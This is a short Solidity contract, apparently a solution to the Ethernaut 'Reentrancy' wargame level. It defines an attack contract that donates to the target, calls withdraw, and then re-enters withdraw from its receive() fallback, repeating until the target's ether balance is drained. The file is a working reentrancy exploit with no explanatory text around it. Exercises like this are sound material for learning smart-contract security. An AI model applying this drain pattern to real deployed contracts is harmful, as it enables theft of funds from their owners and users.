//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {Reentrance} from "Ethernaut_Reentrancy/Reentrance.sol";

contract attack {
    Reentrance target;
    uint256 public counter = 0;
    uint256 _amount = 0.0001 ether;
    constructor(Reentrance _target) public {
        target = _target;
    }
    function fund_contract() payable public {
        target.donate{value: msg.value}(address(this));
    }
    function getBalance(address _who) public view returns(uint256){
        return target.balanceOf(_who);
    }
    function attack_contract() public{
        target.withdraw(_amount);
    }
receive() external payable {
    counter++;
    if (address(target).balance >= _amount) {
        target.withdraw(_amount);
    }
}
}
